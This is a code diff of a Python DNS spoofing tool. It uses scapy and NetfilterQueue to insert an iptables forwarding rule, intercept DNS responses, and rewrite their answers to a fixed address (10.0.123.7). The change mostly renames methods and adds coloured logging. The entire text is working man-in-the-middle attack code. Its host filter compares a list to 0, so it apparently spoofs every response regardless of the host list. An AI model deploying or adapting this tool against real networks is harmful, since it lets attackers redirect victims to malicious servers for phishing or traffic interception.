@@ -2,6 +2,7 @@ import os
 import re
 from scapy.all import IP, DNSRR, DNS, UDP, DNSQR
 from netfilterqueue import NetfilterQueue
+from termcolor import colored
 
 
 class DnsSpoofer:
@@ -11,37 +12,35 @@ class DnsSpoofer:
 		self.queue = NetfilterQueue()
 
 	def start(self):
-		print("Spoofing....")
-		os.system(
-			f'iptables -I FORWARD -j NFQUEUE --queue-num {self.queueNum}')
-		self.queue.bind(self.queueNum, self.callBack)
+		print(colored("[DNS] Started DNS spoofing.", "light_grey"))
+
+		os.system(f"iptables -I FORWARD -j NFQUEUE --queue-num {self.queueNum}")
+		self.queue.bind(self.queueNum, self.spoof)
+
 		try:
 			self.queue.run()
 		except KeyboardInterrupt:
-			os.system(
-				f'iptables -D FORWARD -j NFQUEUE --queue-num {self.queueNum}')
-			print("[!] iptable rule flushed")
+			os.system(f"iptables -D FORWARD -j NFQUEUE --queue-num {self.queueNum}")
+			print(colored("[DNS] Removed IP tables rule.", "light_grey"))
 
-	def callBack(self, packet):
-		scapyPacket = IP(packet.get_payload())
-		if DNSRR in scapyPacket:
+	def spoof(self, packet):
+		scapy_packet = IP(packet.get_payload())
+		if DNSRR in scapy_packet:
 			try:
-				print(f'[original] { scapyPacket[DNSRR].summary()}')
-				queryName = scapyPacket[DNSQR].qname.decode()
-				print(f'Query name: {queryName}')
-				hostCheck = [i for i in self.hosts if re.search(i, queryName)]
-				if hostCheck != 0:
-					scapyPacket[DNS].an = DNSRR(
-						rrname=queryName, rdata="10.0.123.7")
-					scapyPacket[DNS].ancount = 1
-					del scapyPacket[IP].len
-					del scapyPacket[IP].chksum
-					del scapyPacket[UDP].len
-					del scapyPacket[UDP].chksum
-					print(f'[modified] {scapyPacket[DNSRR].summary()}')
-				else:
-					print(f'[not modified] { scapyPacket[DNSRR].rdata }')					
+				query_name = scapy_packet[DNSQR].qname.decode()
+
+				if [i for i in self.hosts if re.search(i, query_name)] != 0:
+					scapy_packet[DNS].an = DNSRR(
+						rrname=query_name, rdata="10.0.123.7")
+					scapy_packet[DNS].ancount = 1
+					del scapy_packet[IP].len
+					del scapy_packet[IP].chksum
+					del scapy_packet[UDP].len
+					del scapy_packet[UDP].chksum
+
+					print(colored(f"[DNS] Spoofed packet: {scapy_packet[DNSRR].summary()}", "light_grey"))
 			except IndexError as error:
-				print(error)
-			packet.set_payload(bytes(scapyPacket))
+				print(colored(f"[DNS] Error: {error}.", "red"))
+
+			packet.set_payload(bytes(scapy_packet))
 		return packet.accept()
